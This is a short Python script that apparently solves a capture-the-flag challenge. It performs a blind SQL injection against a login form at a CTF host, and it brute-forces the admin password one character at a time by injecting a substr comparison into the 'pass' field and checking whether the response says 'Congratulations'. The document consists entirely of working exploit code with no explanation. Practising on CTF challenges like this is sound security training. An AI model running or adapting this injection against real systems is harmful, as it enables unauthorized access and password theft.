import urllib.request

#post request

data = [chr(i) for i in range(41,123)]
print(data)
password = ""
#flag = 0

while 1:
    flag = 0
    for i in range(len(data)):

        params = {
            "id": "admin",
            "pass":"' or substr(pass," + str(len(password)+1) + "," + str(1) + ")='" + data[i] + "';--"
        }
        p = urllib.parse.urlencode(params).encode("utf-8")
        with urllib.request.urlopen('http://ctfq.sweetduet.info:10080/~q6/', data=p) as response:
            html = response.read().decode("utf-8")
            if html.find("Congratulations") != -1:
                password += data[i]
                print(password)
                flag = 1
                break
    if flag == 0:
        break
    
